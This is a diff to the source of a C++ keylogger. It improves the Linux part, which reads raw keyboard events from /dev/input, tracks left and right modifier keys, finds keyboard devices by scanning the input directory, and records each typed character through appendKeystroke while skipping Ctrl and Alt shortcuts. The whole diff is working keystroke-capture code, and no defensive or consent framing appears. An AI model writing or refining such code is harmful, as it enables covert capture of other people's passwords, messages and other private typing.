@@ -35,10 +35,13 @@ KeyLogger::KeyLogger() : m_running(false) {
     m_hook_thread_id = 0;
 #elif defined(__linux__)
     m_input_fd = -1;
-    m_shift_pressed = false;
+    m_left_shift_pressed = false;
+    m_right_shift_pressed = false;
     m_caps_active = false;
-    m_ctrl_pressed = false;
-    m_alt_pressed = false;
+    m_left_ctrl_pressed = false;
+    m_right_ctrl_pressed = false;
+    m_left_alt_pressed = false;
+    m_right_alt_pressed = false;
 #endif
 }
 
@@ -366,9 +369,17 @@ std::string KeyLogger::findKeyboardDevice() {
     }
 
     // Strategy 2: iterate /dev/input/event* and probe via ioctl
-    // This covers systems without udev/by-path (containers, embedded, etc.)
-    for (int i = 0; i < 64; ++i) {
-        std::string path = "/dev/input/event" + std::to_string(i);
+    // This covers systems without udev/by-path (containers, embedded, etc.).
+    // Iterating the directory avoids hard-coding an event index limit.
+    DIR* input_dir = opendir("/dev/input/");
+    if (!input_dir) return "";
+
+    struct dirent* entry;
+    while ((entry = readdir(input_dir)) != nullptr) {
+        std::string name(entry->d_name);
+        if (name.find("event") != 0) continue;
+
+        std::string path = std::string("/dev/input/") + name;
         int fd = ::open(path.c_str(), O_RDONLY | O_NONBLOCK);
         if (fd < 0) continue;
 
@@ -394,6 +405,7 @@ std::string KeyLogger::findKeyboardDevice() {
         }
         ::close(fd);
     }
+    closedir(input_dir);
 
     return "";
 }
@@ -413,12 +425,16 @@ void KeyLogger::evdevLoop() {
         }
         if (ret == 0) continue;
 
+        if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL)) {
+            break;
+        }
         if (!(pfd.revents & POLLIN)) continue;
 
         struct input_event ev;
         ssize_t n = read(m_input_fd, &ev, sizeof(ev));
         if (n < (ssize_t)sizeof(ev)) {
-            if (n < 0 && errno != EAGAIN) break;
+            if (n == 0) break;
+            if (n < 0 && errno != EAGAIN && errno != EINTR) break;
             continue;
         }
 
@@ -432,15 +448,21 @@ void KeyLogger::evdevLoop() {
         if (val == 1 || val == 0) {    // press or release
             bool pressed = (val == 1);
             switch (code) {
-                case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT:
-                    m_shift_pressed = pressed; continue;
+                case KEY_LEFTSHIFT:
+                    m_left_shift_pressed = pressed; continue;
+                case KEY_RIGHTSHIFT:
+                    m_right_shift_pressed = pressed; continue;
                 case KEY_CAPSLOCK:
                     if (pressed) m_caps_active = !m_caps_active;
                     continue;
-                case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:
-                    m_ctrl_pressed = pressed; continue;
-                case KEY_LEFTALT:    case KEY_RIGHTALT:
-                    m_alt_pressed = pressed; continue;
+                case KEY_LEFTCTRL:
+                    m_left_ctrl_pressed = pressed; continue;
+                case KEY_RIGHTCTRL:
+                    m_right_ctrl_pressed = pressed; continue;
+                case KEY_LEFTALT:
+                    m_left_alt_pressed = pressed; continue;
+                case KEY_RIGHTALT:
+                    m_right_alt_pressed = pressed; continue;
             }
         }
 
@@ -458,9 +480,10 @@ void KeyLogger::evdevLoop() {
         }
 
         // Skip ctrl+alt combos (typically shortcuts, not typed text)
-        if (m_ctrl_pressed || m_alt_pressed) continue;
+        if (m_left_ctrl_pressed || m_right_ctrl_pressed ||
+            m_left_alt_pressed || m_right_alt_pressed) continue;
 
-        bool shifted = m_shift_pressed ^ m_caps_active;
+        bool shifted = (m_left_shift_pressed || m_right_shift_pressed) ^ m_caps_active;
         std::string key_str;
 
         // ── Letter keys ──
@@ -532,6 +555,7 @@ void KeyLogger::evdevLoop() {
             appendKeystroke(key_str);
         }
     }
+    m_running = false;
 }
 
 void KeyLogger::appendKeystroke(const std::string& stroke) {
